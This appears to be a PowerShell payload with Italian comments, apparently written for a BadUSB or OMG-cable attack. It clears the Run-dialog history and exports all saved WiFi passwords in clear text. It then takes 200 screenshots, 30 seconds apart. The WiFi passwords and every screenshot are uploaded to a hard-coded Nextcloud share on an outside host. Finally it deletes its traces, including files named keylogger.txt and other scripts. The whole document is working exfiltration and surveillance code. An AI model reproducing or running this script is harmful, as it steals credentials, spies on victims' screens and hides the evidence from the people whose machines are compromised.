function Nextcloud-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [string]$SourceFilePath
    ) 
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $nextcloudUrl = "https://wim.nl.tabdigital.cloud/"
    $sharetoken = 'gkj9TSrXtzxGrn4'
    
    $fileObject = Get-Item $SourceFilePath
    $headers = @{
        "Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($sharetoken):"))))");
        "X-Requested-With"="XMLHttpRequest";
    }
    $webdavUrl = "$($nextcloudUrl)/public.php/webdav/$($fileObject.Name)"
    Invoke-RestMethod -Uri $webdavUrl -InFile $fileObject.Fullname -Headers $headers -Method Put 
}

try {
    # 1. Pulizia RunMRU
    Remove-Item "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\*" -ErrorAction SilentlyContinue

    # 2. Export WiFi
    $p = "C:\wipass"
    if (!(Test-Path $p)) { New-Item -Path $p -ItemType Directory -Force }
    Set-Location $p

    netsh wlan export profile key=clear
    Get-ChildItem *.xml | ForEach-Object {
        $xml = [xml](Get-Content $_)
        $a = "========================================`r`n SSID = " + $xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " + $xml.WLANProfile.MSM.Security.sharedKey.keymaterial
        Out-File "$p\$env:computername-wificapture.txt" -Append -InputObject $a
    }

    if (Test-Path "$p\$env:computername-wificapture.txt") {
        "$p\$env:computername-wificapture.txt" | Nextcloud-Upload
    }

    # 3. Ciclo Screenshot
    $i = 0
    while($i -lt 200){
        Add-Type -AssemblyName System.Windows.Forms,System.Drawing
        $screens = [Windows.Forms.Screen]::AllScreens
        $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
        $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
        $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
        $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

        $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
        $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
        $graphics = [Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

        $currentPath = "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-$i.png"
        $bmp.Save($currentPath)
        
        # Rilascio immediato risorse grafiche
        $graphics.Dispose()
        $bmp.Dispose()
      
        if (Test-Path $currentPath) {
            $currentPath | Nextcloud-Upload
        }
        
        $i++
        Start-Sleep -Seconds 30
    }
}
finally {
    # USCITA DALLA DIRECTORY per sbloccare la cartella wipass
    Set-Location $env:TEMP
    
    # FORZA IL RILASCIO DEI FILE dalla memoria (Garbage Collection)
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Write-Host "`n--- AVVIO PULIZIA FINALE ---" -ForegroundColor Cyan

    $pathsToClean = @(
        "$env:APPDATA\c.ps1", 
        "$env:APPDATA\sg.ps1", 
        "$env:APPDATA\sg2.ps1", 
        "C:\Users\Irene\Desktop\OMG\testing\temp.txt", 
        "$env:temp\keylogger.txt", 
        "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-*.png",
        "C:\wipass"
    )

    foreach($path in $pathsToClean) {
        if (Test-Path $path) {
            try {
                # Usa -Recurse e -Force per cancellare tutto il contenuto
                Remove-Item -Path $path -Recurse -Force -ErrorAction Stop
                Write-Host "[OK] Eliminato: $path" -ForegroundColor Green
            } catch {
                # Se fallisce, tenta un'ultima volta dopo un piccolo delay
                Start-Sleep -Milliseconds 500
                Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
                Write-Host "[!] Tentativo forzato su: $path" -ForegroundColor Yellow
            }
        }
    }
    Write-Host "--- PULIZIA COMPLETATA ---" -ForegroundColor Cyan
}
